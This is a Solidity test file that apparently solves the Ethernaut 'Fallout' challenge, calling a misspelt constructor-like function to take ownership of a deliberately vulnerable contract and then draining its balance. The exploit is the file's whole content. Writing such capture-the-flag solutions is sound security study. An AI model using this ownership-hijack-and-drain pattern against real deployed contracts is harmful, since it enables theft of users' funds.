// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Fallout} from "../src/Fallout.sol";

contract FalloutTest {
    Fallout fallout;

    // Allow this test contract to receive Ether when draining the vault
    receive() external payable {}

    // Foundry runs setup() automatically before tests
    function setUp() public {
        fallout = new Fallout();
    }

    // In Solidity 0.6.0 without forge-std, require() acts as our assertion
    // If any require fails, the test fails. If it finishes without reverting, it passes!

    function test_ExploitFallout() public {
        // 1. Verify initial owner is address(0) because constructor typo failed
        require(fallout.owner() == address(0), "Initial owner should be zero");

        // 2. Call the misspelt function to hijack ownership
        fallout.Fal1out{value: 1 wei}();

        // 3. Verify our test contract is now the owner
        require(fallout.owner() == address(this), "Failed to claim ownership");

        // 4. Drain the vault funds using our new admin privileges
        fallout.collectAllocations();

        // 5. Verify the vault balance is completely drained to 0
        require(address(fallout).balance == 0, "Vault balance is zero");
    }
}
